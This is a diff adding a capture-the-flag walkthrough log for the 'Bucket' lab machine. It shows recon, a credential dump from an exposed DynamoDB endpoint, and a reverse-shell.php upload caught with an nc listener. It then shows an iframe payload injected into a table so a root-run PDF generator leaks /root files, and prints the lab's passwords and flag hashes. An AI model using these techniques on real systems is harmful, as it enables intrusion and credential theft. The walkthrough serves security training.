@@ -1,0 +1,332 @@
+Machine-Name  :  Bucket
+IP-Address    :  10.129.129.99
+
+Command-Line: sudo nmap -p- -T4 -A 10.129.129.99
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 05:25 UTC
+    Nmap scan report for 10.129.129.99
+    Host is up (0.050s latency).
+    Not shown: 65533 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+    |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+    |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+    80/tcp open  http    Apache httpd 2.4.41
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    |_http-title: Did not follow redirect to http://bucket.htb/
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=4/2%OT=22%CT=1%CU=43883%PV=Y%DS=2%DC=T%G=Y%TM=6066AAE4
+    OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
+    OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+    OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+    OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+    OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+    OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+    OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+    OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+    OS:S)
+
+    Network Distance: 2 hops
+    Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 21/tcp)
+    HOP RTT      ADDRESS
+    1   51.51 ms 10.10.14.1
+    2   51.56 ms 10.129.129.99
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 36.60 seconds
+
+Notes: Upon visiting 10.129.129.99, I found a subdomain called "http://s3.bucket.htb".
+RECON: Dirsearch found no paths using the IP 10.129.129.99.
+
+
+Command-Line: ./dirsearch.py /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 50 -u http://s3.bucket.htb
+/home/kali/HackingTools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 28289
+
+Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-02_05-46-34.log
+
+Target: http://s3.bucket.htb/
+
+Output File: /home/kali/HackingTools/dirsearch/reports/s3.bucket.htb/_21-04-02_05-46-34.txt
+
+[05:46:34] Starting:
+[05:46:35] 200 -    2B  - /%2e%2e;/test.txt
+[05:46:35] 200 -    2B  - /%2e%2e;/test/
+[05:46:35] 200 -    2B  - /+CSCOE+/logon.html#form_title_text.php
+[05:46:35] 200 -    2B  - /+CSCOE+/logon.html#form_title_text.txt
+[05:46:35] 200 -    2B  - /+CSCOE+/logon.html#form_title_text
+[05:46:35] 200 -    2B  - /+CSCOE+/logon.html#form_title_text/
+[05:46:35] 200 -    2B  - /+CSCOE+/session_password.html.php
+[05:46:35] 200 -    2B  - /+CSCOE+/session_password.html
+[05:46:35] 200 -    2B  - /+CSCOE+/session_password.html.txt
+[05:46:35] 200 -    2B  - /+CSCOE+/session_password.html/
+[05:46:35] 200 -    2B  - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resou
+[05:46:35] 200 -    2B  - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resou
+[05:46:35] 200 -    2B  - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resou
+[05:46:35] 200 -    2B  - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resou
+[05:46:35] 200 -    2B  - /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_i
+[05:46:38] 200 -    2B  - /%2e%2e;/test
+[05:46:38] 200 -    2B  - /%2e%2e;/test.php
+[05:51:55] 200 -   54B  - /health
+[05:53:49] 403 -  278B  - /server-status/
+[05:53:49] 403 -  278B  - /server-status
+[05:53:57] 200 -    0B  - /shell
+[05:53:57] 200 -   13KB - /shell/
+
+
+Browser: http://s3.bucket.htb/shell/
+URL: Docs: https://docs.aws.amazon.com/cli/latest/reference/dynamodb/
+Notes: Found a JavaScript DynamoDB. Using AWS-CLI to access the database from the command-line.
+
+Command-Line: aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/shell/
+Result:
+    TABLENAMES      users
+
+
+Command-Line: aws dynamodb describe-table --table-name users --endpoint-url http://s3.bucket.htb/shell/
+Result:
+    2021-04-02T05:15:07.280000+00:00        3       arn:aws:dynamodb:ddblocal:000000000000:table/users      users   107     ACTIVE
+    ATTRIBUTEDEFINITIONS    username        S
+    ATTRIBUTEDEFINITIONS    password        S
+    KEYSCHEMA       username        HASH
+    KEYSCHEMA       password        RANGE
+    PROVISIONEDTHROUGHPUT   1970-01-01T00:00:00+00:00       1970-01-01T00:00:00+00:00       0
+           5       5
+
+
+Command-Line: aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/shell/
+Result:
+None    3       3
+    PASSWORD        Management@#1@#
+    USERNAME        Mgmt
+    PASSWORD        Welcome123!
+    USERNAME        Cloudadm
+    PASSWORD        n2vM-<_K_Q:.Aa2
+    USERNAME        Sysadm
+
+
+Command-Line: aws s3 help
+Result:
+          aws s3 cp /tmp/foo/ s3://bucket/ --recursive --exclude "*" --include "*.jpg"
+
+       If  you wanted to include both .jpg files as well as .txt files you can
+       run:
+
+          aws s3 cp /tmp/foo/ s3://bucket/ --recursive \
+              --exclude "*" --include "*.jpg" --include "*.txt"
+
+
+Command-Line: aws --endpoint-url http://s3.bucket.htb/ s3 ls
+Result:
+    2021-04-02 19:37:03 adserver
+
+Command-Line: aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver
+Result:
+                               PRE images/
+    2021-04-02 19:37:04       5344 index.html
+
+Command-Line: aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/images/
+Result:
+    2021-04-02 19:41:04      37840 bug.jpg
+    2021-04-02 19:41:04      51485 cloud.png
+    2021-04-02 19:41:04      16486 malware.png
+
+Command-Line: aws --endpoint-url http://s3.bucket.htb/ s3 cp reverse-shell.php s3://adserver
+Command-Line: aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver
+Result:
+                               PRE images/
+    2021-04-03 02:19:03       5344 index.html
+    2021-04-03 02:19:41       5493 reverse-shell.php
+
+Command-Line: nc -lvnp 9001
+Notes: File is deleted by the system automatically about every 30 seconds. Must act quickly.
+
+Browser: http://bucket.htb/reverse-shell.php
+Result:
+    *** REVERSE SHELL ***
+    $
+
+$ whoami
+Result:
+    www-data
+
+$ export TERM=linux
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@bucket:/$ ls home
+Result:
+    roy
+
+www-data@bucket:/$ cat /home/roy/user.txt
+Result:
+    cat: user.txt: Permission denied
+
+Command-Line: ssh roy@bucket.htb
+Password: n2vM-<_K_Q:.Aa2
+Result:
+    *** USER ACCESS ***
+    Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
+
+     * Documentation:  https://help.ubuntu.com
+     * Management:     https://landscape.canonical.com
+     * Support:        https://ubuntu.com/advantage
+
+      System information as of Sat 03 Apr 2021 02:46:52 AM UTC
+
+      System load:                      0.08
+      Usage of /:                       35.0% of 17.59GB
+      Memory usage:                     30%
+      Swap usage:                       0%
+      Processes:                        247
+      Users logged in:                  0
+      IPv4 address for br-bee97070fb20: 172.18.0.1
+      IPv4 address for docker0:         172.17.0.1
+      IPv4 address for ens160:          10.129.129.99
+      IPv6 address for ens160:          dead:beef::250:56ff:feb9:aff6
+
+
+    229 updates can be installed immediately.
+    103 of these updates are security updates.
+    To see these additional updates run: apt list --upgradable
+
+
+    The list of available updates is more than a week old.
+    To check for new updates run: sudo apt update
+
+
+    The programs included with the Ubuntu system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+    applicable law.
+
+    Last login: Wed Sep 23 03:33:53 2020 from 10.10.14.2
+    roy@bucket:~$
+
+
+roy@bucket:~$ cat user.txt
+Result: 51890f7463e79be6675a570d6ec0f197
+    *** USER OWNED ***
+
+roy@bucket:~$ sudo -l
+Result:
+    [sudo] password for roy:
+    Sorry, user roy may not run sudo on bucket
+
+roy@bucket:/dev/shm$ ./LinEnum.sh
+Result:
+    [-] Listening TCP:
+    Active Internet connections (only servers)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -
+    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:38879         0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+    tcp6       0      0 :::80                   :::*                    LISTEN      -
+    tcp6       0      0 :::22                   :::*                    LISTEN      -
+
+
+roy@bucket:/var/www/bucket-app$ cat index.php
+Result:
+    <?php
+    require 'vendor/autoload.php';
+    use Aws\DynamoDb\DynamoDbClient;
+    if($_SERVER["REQUEST_METHOD"]==="POST") {
+            if($_POST["action"]==="get_alerts") {
+                    date_default_timezone_set('America/New_York');
+                    $client = new DynamoDbClient([
+                            'profile' => 'default',
+                            'region'  => 'us-east-1',
+                            'version' => 'latest',
+                            'endpoint' => 'http://localhost:4566'
+                    ]);
+
+                    $iterator = $client->getIterator('Scan', array(
+                            'TableName' => 'alerts',
+                            'FilterExpression' => "title = :title",
+                            'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
+                    ));
+
+                    foreach ($iterator as $item) {
+                            $name=rand(1,10000).'.html';
+                            file_put_contents('files/'.$name,$item["data"]);
+                    }
+                    passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
+            }
+    }
+    else
+    {
+    ?>
+
+
+Notes: Planning to create a new table within the DB, then loading it with a malicious payload to expose the id_rsa in the root account.
+
+Notes: Create Table.
+URL: https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html
+SYNOPSIS:
+      create-table
+    --attribute-definitions <value>
+    --table-name <value>
+    --key-schema <value>
+Command-Line: aws dynamodb create-table --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --table-name alerts --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://s3.bucket.htb
+Result:
+    TABLEDESCRIPTION        2021-04-05T03:45:17.533000+00:00        0       arn:aws:dynamodb:us-east-1:000000000000:table/alerts    alerts  0       ACTIVE
+    ATTRIBUTEDEFINITIONS    title   S
+    ATTRIBUTEDEFINITIONS    data    S
+    KEYSCHEMA       title   HASH
+    KEYSCHEMA       data    RANGE
+    PROVISIONEDTHROUGHPUT   1970-01-01T00:00:00+00:00       1970-01-01T00:00:00+00:00       0       10      5
+
+
+
+Notes: Add a new instance of the table just created with the malicious payload in the "data" attribute.
+URL: https://docs.aws.amazon.com/cli/latest/reference/dynamodb/put-item.html
+SYNOPSIS:
+      put-item
+    --table-name <value>
+    --item <value>
+Command-Line: aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"}}' --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb
+Result:
+    CONSUMEDCAPACITY        1.0     alerts
+
+Notes: Sending specified data in a POST request using curl to localhost port 8000.
+Command-Line: curl --data "action=get_alerts" http://localhost:8000
+Result:
+    780.html  result.pdf
+
+Notes: Using scp to download the results.
+Command-Line: scp roy@bucket.htb://var/www/bucket-app/files/result.pdf ./
+Command-Line: pdftotext result.pdf id_rsa
+Command-Line: ssh -i id_rsa root@bucket.htb
+Result:
+    Load key "id_rsa": invalid format
+    root@bucket.htb's password:
+
+Notes: Changing the "put-item" call.
+Command-Line: rm -rf id_rsa result.pdf
+
+New-Command: aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<html><head></head><body><iframe src='/root/root.txt'></iframe></body></html>"}}' --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb
+
+Notes: Re-ran all the DB commands from create-table to put-table, then curl and scp command.
+
+Command-Line: pdftotext result.pdf root.txt
+Command-Line: cat root.txt
+Result:
+    0377de1ca62f234795a70710fada0f1e
+
+    pd4ml evaluation copy. visit http://pd4ml.com
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
